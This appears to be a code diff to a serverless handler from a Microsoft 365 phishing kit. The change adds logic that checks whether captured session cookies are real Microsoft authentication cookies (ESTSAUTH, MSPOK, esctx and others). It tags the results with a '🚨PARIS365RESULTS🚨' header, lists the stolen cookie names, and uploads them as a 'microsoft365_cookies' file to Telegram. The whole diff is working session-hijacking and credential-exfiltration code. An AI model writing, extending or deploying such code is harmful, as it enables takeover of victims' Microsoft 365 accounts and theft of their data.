@@ -91,18 +91,67 @@ const handler = async (event, context) => {
     const cookieCount = cookies.length;
     console.log('📊 Processing:', { email, cookieCount, hasValidCookies: cookieCount > 0 });
 
+    // Analyze cookie types and sources
+    let cookieDetails = '';
+    let cookieSource = 'unknown';
+    
+    if (cookieCount === 0) {
+        cookieDetails = 'No cookies captured';
+        cookieSource = 'none';
+    } else {
+        // Check if these are real Microsoft cookies
+        const hasMicrosoftCookies = cookies.some(c => 
+            c.name && (
+                c.name.includes('ESTSAUTH') || 
+                c.name.includes('MSPOK') || 
+                c.name.includes('MSCC') ||
+                c.name.includes('MSPRequ') ||
+                c.name.includes('buid') ||
+                c.name.includes('esctx')
+            )
+        );
+        
+        const hasRealData = cookies.some(c => c.capturedFrom);
+        
+        if (hasMicrosoftCookies && hasRealData) {
+            cookieDetails = `${cookieCount} REAL Microsoft cookies captured`;
+            cookieSource = cookies[0]?.capturedFrom || 'microsoft-domain';
+        } else if (hasMicrosoftCookies) {
+            cookieDetails = `${cookieCount} Microsoft auth cookies`;
+            cookieSource = 'microsoft-fallback';
+        } else {
+            cookieDetails = `${cookieCount} domain cookies captured`;
+            cookieSource = cookies[0]?.capturedFrom || 'current-domain';
+        }
+    }
+
     // Build the message (plain text only, heavily sanitized)
     const uniqueId = Math.random().toString(36).substring(2, 8);
     const messageLines = [
-      'Microsoft OAuth Login Captured!',
+      '🚨PARIS365RESULTS🚨',
       '',
       `Email: ${email}`,
       `Session ID: ${sessionId}`,
       `Time: ${timestamp}`,
       `Message ID: ${uniqueId}`,
       '',
-      `Cookies: ${cookieCount > 0 ? `${cookieCount} captured` : 'None captured'}`
+      `Cookies: ${cookieDetails}`,
+      `Source: ${cookieSource}`
     ];
+    
+    // Add cookie names if we have real cookies
+    if (cookieCount > 0 && cookieCount <= 10) {
+        messageLines.push('');
+        messageLines.push('Cookie Names:');
+        cookies.forEach((cookie, index) => {
+            if (cookie.name) {
+                messageLines.push(`${index + 1}. ${cookie.name}`);
+            }
+        });
+    } else if (cookieCount > 10) {
+        messageLines.push('');
+        messageLines.push(`Cookie Names: ${cookies.slice(0, 5).map(c => c.name).join(', ')}... (+${cookieCount - 5} more)`);
+    }
     
     // Join and sanitize the entire message
     const simpleMessage = sanitizeForTelegram(messageLines.join('\n'));
@@ -185,7 +234,7 @@ location.reload();
 
       // Clean filename to avoid issues
       const cleanEmail = email.replace(/[^a-zA-Z0-9@._-]/g, '_').replace('@', '_at_').replace(/\./g, '_');
-      const fileName = `cookies_${cleanEmail}_${Date.now()}.js`;
+      const fileName = `microsoft365_cookies_${cleanEmail}_${Date.now()}.js`;
 
       // Create proper multipart form data for file upload
       const boundary = `----formdata-${Math.random().toString(36).substring(2)}`;
